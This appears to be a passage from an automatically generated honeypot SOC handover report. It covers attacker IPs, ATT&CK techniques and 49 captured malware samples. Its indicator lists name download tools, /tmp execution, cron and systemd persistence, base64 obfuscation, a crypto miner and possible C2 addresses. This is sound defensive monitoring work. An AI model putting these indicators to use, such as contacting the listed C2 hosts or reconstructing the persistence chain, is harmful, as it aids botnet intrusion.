| `18.218.118[.]203` | 1 | 2026-10-29 00:57 | 2026-10-29 00:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.93.193[.]100` | 1 | 2026-10-29 01:59 | 2026-10-29 01:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.44.6[.]221` | 1 | 2026-10-29 02:48 | 2026-10-29 02:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.101.128[.]201` | 1 | 2026-10-29 01:57 | 2026-10-29 01:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.105.139[.]69` | 1 | 2026-10-29 01:29 | 2026-10-29 01:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `189.89.89[.]0` | 1 | 2026-10-29 02:50 | 2026-10-29 02:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-10-29 02:15 | 2026-10-29 02:15 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.151.191[.]44` | 1 | 2026-10-29 01:09 | 2026-10-29 01:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.86.104[.]237` | 1 | 2026-10-29 01:32 | 2026-10-29 01:32 | 2s | 0 | `T1592` | 🟢 LOW |
| `39.76.134[.]245` | 1 | 2026-10-29 00:40 | 2026-10-29 00:40 | 12s | 0 | `T1592` | 🟢 LOW |
| `42.100.20[.]142` | 1 | 2026-10-29 01:08 | 2026-10-29 01:09 | 14s | 0 | `T1592` | 🟢 LOW |
| `42.51.37[.]22` | 1 | 2026-10-29 00:01 | 2026-10-29 00:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | 1 | 2026-10-29 01:03 | 2026-10-29 01:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.251.81[.]121` | 1 | 2026-10-29 01:06 | 2026-10-29 01:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-29 00:00 | 2026-10-29 00:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.210.142[.]175` | 1 | 2026-10-29 00:28 | 2026-10-29 00:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]212` | 1 | 2026-10-29 02:51 | 2026-10-29 02:51 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `220.127.148[.]6` | KR | Seuteuwoldeu | **100** ⚠️ | 46 |
| `107.150.99[.]91` | US | UCLOUD | **100** ⚠️ | 10 |
| `173.249.52[.]138` | FR | Contabo GmbH | **100** ⚠️ | 50 |
| `187.174.238[.]116` | MX | Uninet S.A. de C.V. | **100** ⚠️ | 50 |
| `129.121.102[.]198` | US | Oso Grande IP Services, LLC | **100** ⚠️ | 4 |
| `121.189.244[.]35` | KR | Korea Telecom | **100** ⚠️ | 11 |
| `101.200.216[.]59` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 2 |
| `195.178.110[.]218` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `162.243.51[.]139` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 96 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 94 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 42 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 30 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 13 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 144 cases |
| Tool 34  | Credential Extractor        | ✅ 514 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 21 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (10.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 40 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 94 priority case(s) shown individually · 33 recon entry/entries in table (2 group(s) consolidating 4 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-29T03:24:08Z_
